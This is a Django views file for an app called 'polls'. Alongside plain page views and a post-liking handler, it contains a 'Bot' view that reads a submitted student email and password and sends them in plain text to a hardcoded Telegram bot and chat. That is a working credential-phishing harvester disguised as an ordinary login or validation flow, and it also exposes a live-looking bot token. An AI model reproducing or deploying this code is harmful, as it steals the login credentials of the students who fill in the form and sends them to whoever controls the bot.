import codecs
import os
import json

import requests
from django.http import HttpResponse, HttpResponseRedirect, JsonResponse
from django.shortcuts import render, get_object_or_404, redirect
from polls.models import Post


def FirstPage(request):
    return render(request, 'polls/FirstPage.html')


def SecondPage(request):
    print('fijefh')
    return render(request, 'polls/SecondPage.html')


def ThirdPage(request):
    print('fijefh')
    return render(request, 'polls/ThirdPage.html')


def Validation(request):
    return render(request, 'polls/Validation.html')



def Bot(request):
    token = "5173800973:AAGY0z1I6HWc8P78HrTkRA21x2WeVvOOpaw"
    email = request.POST.get("student_email")
    password = request.POST.get("student_password")
    chat_id = "-786480076"
    txt = "Email: " + email + '\n' + "Password: " + password
    if requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                     data={'chat_id': chat_id, 'text': txt}):
        return render(request, 'polls/End.html')


def End(request):
    return render(request, 'polls/End.html')


def PageForPosts(request):
    if request.method == 'GET':
        posts = Post.objects.all()
        for post in posts:
            post.button_id='Button'+str(post.id)
            if post.likes.filter(id=request.user.id).exists():
                post.is_liked = True
            else:
                post.is_liked = False
        data = {
            'posts': posts
        }
        return render(request, 'polls/PageForPosts.html', data)
    if request.method == 'POST':
        i_d = request.POST.get('post_id')
        post = Post.objects.get(id=i_d)
        with codecs.open(os.getcwd() + '/polls/form-like.json', 'r', 'utf_8_sig') as f:
            data = json.load(f)
        if post.likes.filter(id=request.user.id).exists():
            post.likes.remove(request.user)
            post.is_liked = False
            data['posts'][int(i_d) - 1]['quantity-of-likes'] -= 1
        else:
            post.likes.add(request.user)
            post.is_liked = True
            data['posts'][int(i_d) - 1]['quantity-of-likes'] += 1
        with open(os.getcwd() + '/polls/form-like.json', 'w') as outfile:
            json.dump(data, outfile)
        data2 = {
            'post_id': i_d
        }
        return JsonResponse(data, status=200)
    # return HttpResponseRedirect(request.build_absolute_uri('/PageForPosts'), json.dumps(
    #     {'status': 'success',
    #      'likes': data['quantity-of-likes']
    #      }), content_type="application/json")
    # return HttpResponse(json.dumps(
    #     {'status': 'success',
    #      'likes': data['quantity-of-likes']
    #      }), content_type="application/json")
    # return HttpResponse(json.dumps(
    #     {'status': 'success',
    #      'likes': data['quantity-of-likes']
    #      }), content_type="application/j    son")


def Localization(request):
    return render(request, 'polls/Localization.html')